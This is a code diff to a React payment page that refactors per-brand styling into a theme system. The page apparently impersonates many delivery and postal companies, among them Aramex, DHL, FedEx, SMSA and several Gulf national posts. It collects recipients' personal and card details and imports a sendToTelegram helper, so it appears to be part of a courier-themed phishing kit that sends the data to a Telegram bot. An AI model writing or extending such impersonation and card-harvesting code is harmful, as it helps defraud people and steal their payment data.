@@ -6,7 +6,6 @@ import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
@@ -14,26 +13,14 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
-import heroAramex from "@/assets/hero-aramex.jpg";
-import heroDhl from "@/assets/hero-dhl.jpg";
-import heroFedex from "@/assets/hero-fedex.jpg";
-import heroSmsa from "@/assets/hero-smsa.jpg";
-import heroUps from "@/assets/hero-ups.jpg";
-import heroEmpost from "@/assets/hero-empost.jpg";
-import heroZajil from "@/assets/hero-zajil.jpg";
-import heroNaqel from "@/assets/hero-naqel.jpg";
-import heroSaudipost from "@/assets/hero-saudipost.jpg";
-import heroKwpost from "@/assets/hero-kwpost.jpg";
-import heroQpost from "@/assets/hero-qpost.jpg";
-import heroOmanpost from "@/assets/hero-omanpost.jpg";
-import heroBahpost from "@/assets/hero-bahpost.jpg";
-import heroBg from "@/assets/hero-bg.jpg";
+import { useTheme } from "@/themes/ThemeContext";
 
 const PaymentRecipient = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
   const updateLink = useUpdateLink();
+  const { theme } = useTheme();
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
@@ -46,7 +33,6 @@ const PaymentRecipient = () => {
   const titleParam = urlParams.get('title');
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
   const companyMeta = getCompanyMeta(serviceKey);
 
   // Use dynamic company meta for OG tags
@@ -83,28 +69,6 @@ const PaymentRecipient = () => {
   const formattedAmount = formatCurrency(amount, currencyCode);
 
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
-  
-  const heroImages: Record<string, string> = {
-    'aramex': heroAramex,
-    'dhl': heroDhl,
-    'dhlkw': heroDhl,
-    'dhlqa': heroDhl,
-    'dhlom': heroDhl,
-    'dhlbh': heroDhl,
-    'fedex': heroFedex,
-    'smsa': heroSmsa,
-    'ups': heroUps,
-    'empost': heroEmpost,
-    'zajil': heroZajil,
-    'naqel': heroNaqel,
-    'saudipost': heroSaudipost,
-    'kwpost': heroKwpost,
-    'qpost': heroQpost,
-    'omanpost': heroOmanpost,
-    'bahpost': heroBahpost,
-  };
-  
-  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -191,22 +155,29 @@ const PaymentRecipient = () => {
       <div 
         className="min-h-screen bg-background" 
         dir="rtl"
+        style={{
+            background: 'var(--color-background)',
+            fontFamily: 'var(--font-family)',
+        }}
       >
         {/* Hero Section */}
         <div className="relative w-full h-48 sm:h-64 overflow-hidden">
-          <img 
-            src={heroImage}
-            alt={serviceName}
-            className="w-full h-full object-cover"
+          <div
+            className="w-full h-full"
+            style={{
+                backgroundImage: 'var(--hero-image)',
+                backgroundSize: 'cover',
+                backgroundPosition: 'center',
+            }}
           />
           <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
           
           {/* Logo Overlay */}
           <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
-            {branding.logo && (
+            {theme?.logo && (
               <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                 <img 
-                  src={branding.logo} 
+                  src={theme.logo}
                   alt={serviceName}
                   className="h-12 sm:h-16 w-auto"
                   onError={(e) => e.currentTarget.style.display = 'none'}
@@ -227,7 +198,7 @@ const PaymentRecipient = () => {
         <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
           <div className="max-w-2xl mx-auto">
             
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
+            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: 'var(--color-primary)' }}>
               <form onSubmit={handleProceed}>
                 <div className="flex items-center justify-between mb-6 sm:mb-8">
                   <h1 className="text-xl sm:text-3xl font-bold">معلومات المستلم</h1>
@@ -235,7 +206,7 @@ const PaymentRecipient = () => {
                   <div
                     className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                     style={{
-                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                      background: 'var(--gradient)',
                     }}
                   >
                     <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
@@ -311,7 +282,11 @@ const PaymentRecipient = () => {
                   size="lg"
                   className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                   style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                    background: 'var(--gradient)',
+                    padding: 'var(--button-padding)',
+                    borderRadius: 'var(--button-border-radius)',
+                    fontWeight: 'var(--button-font-weight)',
+                    textTransform: 'var(--button-text-transform)',
                   }}
                 >
                   <span className="ml-2">التالي</span>
